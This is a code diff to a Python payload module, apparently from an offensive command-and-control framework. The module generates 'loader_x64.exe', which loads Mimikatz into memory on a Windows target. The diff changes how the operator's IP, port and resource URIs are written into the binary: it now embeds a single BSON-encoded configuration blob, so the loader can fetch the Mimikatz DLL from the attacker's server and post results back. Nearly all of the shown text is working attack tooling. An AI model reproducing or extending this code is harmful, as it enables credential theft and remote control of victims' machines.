@@ -5,6 +5,7 @@ import hashlib
 sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
 from utils.db import DB
 from utils.output import Output
+from utils.bson import BSON
 from server.ressources import get_ressource_md5, powershell_encode_base64
 
 class Payload:
@@ -12,7 +13,7 @@ class Payload:
     type = 'cmd'
     args = ['ip:http_port']
     filename = 'loader_x64.exe'
-    md5 = hashlib.md5(b'loader_mimikatz_dll_x64')
+    md5 = hashlib.md5(b'loader_mimikatz_dll_x64').hexdigest()
 
     def generate_payload(self, ip_port):
         # Mimikatz in memory
@@ -28,19 +29,44 @@ class Payload:
 
         ip = ip_port.split(':')[0]
         port = ip_port.split(':')[-1]
+        # make BSON calculation
+        bson = BSON.encode({
+            "ip": ip,
+            "port": int(port),
+            "uri_get": "/ressources/%s" % mimikatz_md5,
+            "uri_post": "/ressources/%s" % self.md5,
+            "function": "launch",
+        })
         # replace
-        binary = self.replace(binary, b"IP@@@@@@@@@@@@@@@@@@@@@@@@@", ip) 
-        binary = self.replace(binary, b"PORT@@@@@", port) 
-        binary = self.replace(binary, b"URI_DLL@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "/ressources/%s" % mimikatz_md5) 
-        binary = self.replace(binary, b"URI_RES@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "/ressources/%s" % self.md5) 
-        binary = self.replace(binary, b"FUNCTION@@@@@@@@@@@@@@@@", "launch") 
+        #binary = self.replace(binary, b"IP@@@@@@@@@@@@@@@@@@@@@@@@@", ip) 
+        #binary = self.replace(binary, b"PORT@@@@@", port) 
+        #binary = self.replace(binary, b"URI_DLL@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "/ressources/%s" % mimikatz_md5) 
+        #binary = self.replace(binary, b"URI_RES@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "/ressources/%s" % self.md5) 
+        #binary = self.replace(binary, b"FUNCTION@@@@@@@@@@@@@@@@", "launch") 
+
+        binary = self.replace(binary, b"DATA@@@@@@@@@@@@@@@@@@@", bson, buffer_size = 200)
 
         return binary
 
-    def replace(self, binary, pattern, value):
-        value = value.encode()
+    def replace(self, binary, pattern, value, buffer_size=None):
+        if type(value) == str:
+            value = value.encode()
 
-        binary = binary.replace(pattern, value + b"\x00"*(len(pattern) - len(value)))
+        if buffer_size == None:
+            buffer_size = len(pattern)
+            toremove = 0
+        else:
+            toremove = buffer_size - len(pattern)
+
+        if len(value) > buffer_size:
+            raise Exception("Data to add to the binary larger than the allocated size")
+
+        parts = binary.split(pattern)
+        binary_start = parts[0]
+        binary_end = parts[1][toremove:]
+
+        #binary = binary.replace(pattern, value + b"\x00"*(buffer_size - len(value)))
+        binary = binary_start + value + b"\x00"*(buffer_size-len(value)) + binary_end
 
         return binary        
 
